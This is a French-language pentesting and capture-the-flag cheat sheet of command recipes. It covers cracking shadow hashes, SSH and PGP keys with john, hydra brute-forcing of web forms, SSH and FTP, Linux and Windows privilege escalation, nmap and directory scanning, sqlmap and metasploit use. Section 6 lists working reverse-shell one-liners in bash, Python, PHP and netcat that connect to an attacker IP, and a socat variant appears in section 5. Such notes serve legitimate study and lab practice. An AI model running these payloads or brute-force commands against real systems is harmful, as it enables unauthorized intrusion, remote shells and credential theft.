# 1) Cracker un mot de passe chiffré
1. On obtient un mot de passe présent dans /etc/shadow, on le récupère dans un fichier root.hash
```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```
2. On crack le hash via john
```
john --wordlist=/chemin/vers/wordlist root.hash
```

# 2) Cracker un clef RSA chiffré
1. On met la main sur une cléf RSA chiffré, on la récupère et on la mets dans un fichier id_rsa
2. On converti la clé RSA chiffrée en format John-readable
```
ssh2john id_rsa > id_rsa.hash
```
3. On crack le hash avec John 
```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
4. Se connecter en renseignant la cléf 
```
ssh [USER]@[IP] -i [CLEF]
```

# 3) Bruteforce un formulaire web
## Hydra 
1. Noté les noms des balises username et password
2. Vérifier si il s'agit d'une méthode POST ou GET
3. Récuperer message d'erreur 
4. Récupérer l'URL de la page 
5. Ne pas modifier ^USER^ et ^PASS^ 
6. Modifier le login, la méthode, l'URL d'accès, Le message d'erreur
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.170.167 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
```
# 4) Elevation de privilèges Linux
## Sudo 
* **Base de la faille** : L'utilisation inappropriée de la commande `sudo` par les administrateurs système peut donner à certains utilisateurs des privilèges qu'ils ne devraient pas avoir. Si un utilisateur a le droit d'exécuter une commande ou un binaire avec des privilèges `root` sans restriction, cela peut être exploité.

* **Comment c'est possible** : Disons qu'un utilisateur peut exécuter `vim` avec `sudo` sans mot de passe. Cela signifie qu'il peut éditer n'importe quel fichier en tant que `root` ou lancer un shell avec des droits `root`.
1. On regarde les commandes executables en sudo 
```
sudo -l
```
2. On cherche sur GTFObins les possibilités de la commande en tant que root pour :
	* Obtenir un shell root
	* Lire un fichier sensible : /etc/shadow
	* Modifier fichier sensible (crontab par exemple)
	* Déployer un reverse shell
	* Transfert de fichiers
## SUID
* **Base de la faille** : Les binaires avec le bit SUID permettent à l'exécutable d'être exécuté avec les droits du propriétaire du fichier plutôt qu'avec les droits de l'utilisateur qui l'exécute. Si un binaire vulnérable ou mal configuré a le bit SUID défini, cela peut être exploité.
* **Comment c'est possible** : Un exemple courant est un binaire qui a le bit SUID défini et qui exécute des opérations sans valider ou désinfecter correctement les entrées. Un attaquant pourrait exploiter cela pour exécuter des commandes arbitraires.
1. Lister les binaires (commandes), exécutable en tant que leur propriétaires (root)
```
find / -perm -4000 2>/dev/null
```
## Cron
* **Base de la faille** : Des tâches `cron` executés en tant que root peuvent être attaquables en modifiant l'execution finale de la tache et on peut se créer un reverse shell root
1. Lister les tâches qui seront executés de facons régulière en tant que root
```
cat /etc/crontab
ls -alh /etc/cron* cat /etc/crontab
```
2. Si un tache est executé et se base sur un URL, on peut modifier /etc/hosts
## Services root 
* **Base de la faille** : Les services sont souvent lancés avec des droits élevés. Si un service est vulnérable ou mal configuré, il peut être exploité pour obtenir ces droits.
* **Comment c'est possible** : Un service mal configuré pourrait, par exemple, charger des bibliothèques à partir d'un chemin non sécurisé, permettant à un attaquant d'y injecter sa propre bibliothèque.
1. Lister les services qui se lancent en root pour y injecter des modifications
```
systemctl list-units --type=service
```

## Fichier de configuration mal configurés
* **Base de la faille** : Les fichiers de configuration peuvent parfois contenir des informations sensibles comme des mots de passe. Si ces fichiers sont lisibles par des utilisateurs non privilégiés, ils peuvent être exploités.
* **Comment c'est possible** : Un attaquant qui peut lire un fichier de configuration contenant un mot de passe en clair peut utiliser ce mot de passe pour obtenir des privilèges ou accéder à d'autres systèmes ou services.
```
find /etc/ -readable -type f 2>/dev/null
```

## Permissions de groupe laxistes
* **Base de la faille** : Si un fichier ou un répertoire a des permissions de groupe inappropriées, cela peut permettre à des utilisateurs non autorisés d'écrire ou de modifier ces fichiers.
* **Comment c'est possible** : Si un utilisateur fait partie d'un groupe qui peut écrire dans un fichier exécuté par un utilisateur avec des privilèges élevés, il peut modifier ce fichier pour inclure du code malveillant.
1. Lister les répertoires ou mon groupe est présent 
```
find / -group GROUP_NAME -perm -g+w 2>/dev/null
```
## Faiblesses de sécurité dans le noyau
* **Base de la faille** : Des vulnérabilités dans le noyau peuvent permettre à un attaquant d'élever ses privilèges de `user` à `root`.
* **Comment c'est possible** : Si un utilisateur peut exploiter une vulnérabilité du noyau, comme une condition de course, il peut potentiellement obtenir un accès `root`. Des outils comme `searchsploit` peuvent être utilisés pour trouver des exploits connus pour une version de noyau spécifique.
1. Afficher les informations du noyau
```
uname -a
```

# 5) Amelioration de shells

## Python
1. Importer le module pty pour améliorer le shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
## Socat 
1. Sur l'attaquant 
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
2. Sur la machine cible
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
## Stty
1. Sur la cible
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```
2. Sur l'attaquant
```
$ stty raw -echo
$ fg
```
3. Sur la cible
```
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

# 6) Reverse Shells (cible vers nous)
## BASH
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
## Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
## Netcat 
1. Ouvrir un port sur la machine attaquante
```
nc -lvp 4444
```
3. Connecter un shell sh vers le port de la machine attaquante
```
nc -e /bin/sh [IP_ATTAQUANT] [PORT]
```
❗️ Toutes les machines n'ont pas netcat avec l'option -e


# 7) Reconnaissance active
## Comportement de base de nmap
- **Ports**: Par défaut, Nmap scanne les 1 000 ports TCP les plus couramment utilisés.
- **Vitesse**: Si aucune option de timing n'est spécifiée, Nmap choisit un timing basé sur le réseau et la cible. L'option `-T3` est généralement le niveau de timing par défaut.
- **Scripts**: Les scripts ne sont pas exécutés par défaut. Vous devez utiliser `-sC` ou `--script` pour spécifier les scripts que vous voulez exécuter.
- **Technique de scan**: Nmap utilisera le scan SYN (ou "half-open" scan) par défaut si exécuté en tant que root. Sinon, il utilise le scan connect(). Le scan SYN est plus rapide et moins intrusif que le scan connect(), car il n'établit jamais de connexion complète.

## Options courantes
* -A : combinaison de plusieurs fonctionnalités avancées.
	1. **Détection du système d'exploitation (`-O`)** : Nmap essaiera de déterminer le système d'exploitation (OS) de la cible.
	2. **Détection de version (`-sV`)** : Nmap déterminera les services en cours d'exécution sur les ports ouverts et tentera d'identifier leur version spécifique.
	3. **Script scan (`-sC`)** : Exécute un ensemble de scripts NSE (Nmap Scripting Engine) par défaut. Ces scripts sont généralement considérés comme "sûrs" à exécuter, mais ils peuvent être très informatifs et révéler des informations supplémentaires sur la cible.
	4. **Traceroute (`--traceroute`)** : Nmap exécutera un traceroute vers la cible pour déterminer le chemin des paquets à travers le réseau.
* TX : Vitesse d'execution du scan 
	1. **T0 (paranoiac)**: Extrêmement lent. Il envoie des paquets de manière très espacée pour réduire la probabilité d'être détecté par des dispositifs comme les IDS (systèmes de détection d'intrusion) ou les IPS (systèmes de prévention d'intrusion).
	2. **T1 (sneaky)**: Encore lent, mais pas autant que T0. Il est conçu pour être discret, mais est plus rapide que le mode paranoiac.
	3. **T2 (polite)**: Plus rapide que T1 et T0, mais prend encore des mesures pour ne pas surcharger le réseau ou la cible. Il envoie des paquets à un rythme qui devrait éviter d'encombrer le réseau.
	4. **T3 (normal)**: C'est le mode par défaut de Nmap. Il n'a pas de retard spécial entre les paquets comme les modes précédents. Dans ce mode, Nmap prend des décisions basées sur les réponses du réseau, ajustant ses délais en conséquence.
	5. **T4 (aggressive)**: Plus rapide que T3. Il envoie des paquets plus rapidement, en réduisant considérablement les délais. Il existe un risque plus élevé de fausser certains résultats ou d'engorger les réseaux avec cette option.
	6. **T5 (insane)**: C'est le mode le plus rapide. Il est utile lorsque la cible est sur un réseau local ou lorsqu'on sait que la cible peut gérer une telle quantité de trafic. Il peut facilement causer des problèmes sur les réseaux ou avec les cibles s'ils ne sont pas préparés à gérer une telle charge.

## Utilisation de nmap
1. Scan de port nmap
```
nmap [IP_CIBLE] -p- -T4 -A -oN result_nmap.txt
nmap [IP_CIBLE] -p- -T4 -sC -sV -oN result_nmap.txt
```
2. Lister les scripts NSE
```
ls /usr/share/nmap/scripts/
ls /usr/share/nmap/scripts/ | grep [PROTOCOLE]
````
3. Executer scripts NSE
```
nmap -p [PORT] --script [NOMSCRIPT] [IP_CIBLE]
nmap -p [PORT] --script [NOMSCRIPT1],[NOMSCRIPT2] [IP_CIBLE]
```

# 8) Directory Bruteforcing

## Liste des wordlists utiles
- `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt` ==> Utilise pour IIS qui n'est pas sensible à la casse
- `/usr/share/seclists/Discovery/Web-Content/common.txt`
- `/usr/share/seclists/Discovery/Web-Content/big.txt`
- `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`
- `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt`
## Gobuster
1. Lancer une attaque sur un URL
```
gobuster dir -u http://[IP]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
## Dirb 
1. Lancer une attaque sur un URL
```
dirb http://[IP]/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Wfuzz
1. Lancer une attaque sur un URL
```
wfuzz -u http://[IP]/FUZZ -w /path/to/wordlist.txt
```


# 9) Bruteforce de service 
## Wordlists à utiliser

### Utilisateurs 
* [ssh-usernames.txt](https://github.com/pentestmonkey/yaptest/blob/master/ssh-usernames.txt) 
* [ftp-usernames.txt](https://github.com/pentestmonkey/yaptest/blob/master/ftp-usernames.txt "ftp-usernames.txt")
### Mot de passe
* ``/usr/share/wordlists/rockyou.txt`` 
* [ssh-passwords.txt](https://github.com/pentestmonkey/yaptest/blob/master/ssh-passwords.txt "ssh-passwords.txt") 
* [ftp-passwords.txt](https://github.com/pentestmonkey/yaptest/blob/master/ftp-passwords.txt "ftp-passwords.txt")

## SSH 
1. Bruteforcer un service SSH sans aucunes informations
```
hydra -L [WORDLIST_USERS] -P [WORDLIST_PASSWD] [IPCIBLE] ssh -t 4
```
2. Bruteforcer un service SSH en ayant le login
```
hydra -l [user] -P [WORDLIST_PASSWD] [IPCIBLE] ssh -t 4
```
3. Bruteforcer un service SSH en ayant le mot de passe
```
hydra -L [WORDLIST_USERS] -p [password] [IPCIBLE] ssh -t 4
```
## FTP
1. Bruteforcer un service FTP sans aucunes informations**:
```
hydra -L [WORDLIST_USERS] -P [WORDLIST_PASSWD] [IPCIBLE] ftp -t 4
```
2. **Bruteforcer un service FTP en ayant le login**:
```
hydra -l [user] -P [WORDLIST_PASSWD] [IPCIBLE] ftp -t 4
```
3. **Bruteforcer un service FTP en ayant le mot de passe**:
```
hydra -L [WORDLIST_USERS] -p [password] [IPCIBLE] ftp -t 4
```


# 10) Injection SQL

## SQLmap
1. Injection dans un formulaire de connexion 
```
sqlmap -u http://example.com/login.php --data="username=admin&password=admin" --method POST --dbs

```

# 11) Elevation de privilèges Windows

## **UAC (User Account Control) Bypass**
* **Base de la faille**: UAC est une mesure de sécurité dans Windows pour empêcher des changements non autorisés. Cependant, certains binaires Microsoft sont autorisés à s'exécuter avec des privilèges élevés sans prompt UAC. Si ces binaires sont vulnérables à une attaque d'élévation de privilèges, ils peuvent être exploités.
* **Comment c'est possible**: Un attaquant pourrait abuser de ces binaires pour exécuter du code malveillant avec des privilèges élevés.

## **Token Manipulation**
* **Base de la faille**: Les tokens représentent les droits et privilèges d'un processus. Si un attaquant peut accéder à un token avec des droits élevés, il peut l'exploiter pour élever ses privilèges.
* **Comment c'est possible**: En utilisant des outils comme `incognito` pour voler les tokens des processus en cours d'exécution et les utiliser pour exécuter du code avec des privilèges élevés.

## **Tâches planifiées**
* **Base de la faille**: Tout comme cron jobs sous Linux, les tâches planifiées peuvent être mal configurées.
* **Comment c'est possible**: Si une tâche planifiée exécute un script ou un binaire situé dans un emplacement accessible en écriture, un attaquant peut le remplacer ou le modifier pour obtenir des privilèges élevés.
```
schtasks /query /fo LIST /v
```

## **DLL Hijacking**
* **Base de la faille**: Si une application tente de charger une DLL (bibliothèque de liens dynamiques) et que le chemin n'est pas spécifié, Windows cherche dans plusieurs emplacements pour la DLL. Si un attaquant peut placer sa propre DLL malveillante dans l'un de ces emplacements, elle peut être exécutée avec les privilèges de l'application.
* **Comment c'est possible**: En plaçant une DLL malveillante dans un emplacement accessible en écriture et attendre qu'une application vulnérable soit exécutée.

## **Service Permissions**
* **Base de la faille**: Si les permissions d'un service Windows sont mal configurées, cela pourrait permettre à un utilisateur non privilégié de modifier comment ce service fonctionne.
* **Comment c'est possible**: Par exemple, si un attaquant a la permission d'écrire sur le binaire exécuté par un service ou peut changer le chemin du binaire que le service exécute, il peut élever ses privilèges.
```
sc qc [service_name]
```

## **AlwaysInstallElevated Registry Key**
* **Base de la faille**: Si cette clé de registre est configurée pour permettre des installations avec des privilèges élevés, cela peut être exploité.
* **Comment c'est possible**: Un attaquant pourrait installer un logiciel malveillant qui s'exécute avec des privilèges élevés.

## **Vulnérabilités du noyau**
* **Base de la faille**: Tout comme sous Linux, le noyau Windows peut avoir des vulnérabilités qui permettent l'élévation de privilèges.
* **Comment c'est possible**: Un attaquant pourrait exploiter une vulnérabilité du noyau pour obtenir des droits `SYSTEM`. Des outils comme `windows-exploit-suggester` peuvent aider à trouver des exploits pour une version spécifique de Windows.


# 12) Chercher des vulnérabilités 
1. Lister le nom du service
2. Lister la version du service
3. Rechercher faille sur exploit-db
```
searchsploit [SERVICE/VERSION]
searchsploit -m [CHEMIN]
```
4. Rechecher exploitation metasploit
```
msfconsole
> search [SERVICE/VERSION]
> use [NUM|CHEMIN]
> show options
> set [VARIABLE] [VALEURS]
> run
```
5. Chercher sur internet le nom du service 
6. Chercher sur internet la version du service
* Liste de site à regarder 
	* Hacktrickz
	* HackerRecipe
	* Autres sites
7. Trouver le nom de la CVE relié et comprendre l'explication (CHATGPT + docs)
8. Télécharger et exécuter l'exploitation
```
chmod +x [FICHIER]
python ./[FICHIER] -h
python ./[FICHIER] ...
python2 ./[FICHIER] ...
python3 ./[FICHIER] ...
```


# 13) Déchiffre un fichier PGP
* Necessité de 2 fichiers 
	* [fichier].pgp : Fichier chiffré via une clef PGP
	* [fichier].asc : Cléf de chiffrement du fichier
1. Convertir cléf de chiffrement en john readable
```
gpg2jhohn [FICHIER].asc > [FICHIER.asc].hash
```
2. Cracker le mot de passe de la cléf via john
```
john --wordlist=/usr/share/wordlists/rockyou.txt id_pgp.hash[FICHIER.asc].hash
```
3. Déchiffré le fichier chiffré via le mot de passe de la cléf de chiffrement
```
gpg --output [FICHIER_SORTIE] --decrypt [FICHIER].pgp
```

# 14) Transférer fichier via python
1. Sur la machine émettrice (là où se trouve le fichier à partager)
```
python3 -m http.server [PORT]
```
2. Sur la machine réceptrice (pour télécharger le fichier)
```
curl http://[IP]:[PORT]/[FICIHIER] -o [NOM_SORTIE]
```

# 15) Stéganographie
1. Utiliser exiftool
```
exiftool [IMAGE]
```
2. Utiliser exif
```
exif [IMAGE]
```
3. Utiliser strings
```
strings [IMAGE]
```
4. Utiliser binwalk
```
binwalk [IMAGE] # # Lister les données fichiers cachés
binwalk -e [IMAGE] --run-as=root # Extraire des données cachés
```
5. Utiliser stegseek et steghide pour les JPEG uniquement 
```
stegseek @image.jpg # Cracker la passphrase
steghide --extract -sf @image.jpg # Extraire les données cachés
```



# 16) Fonctionnement page connexion
1. Rechercher les fichiers JS et les scripts qui s'exécute dans `Debugger`
2. Regarde les conditions de connexion cookie dans les scripts
3. Ajouter cookie si faille du style dans `Storage/Cookie/+` en modifiant la valeur et refresh 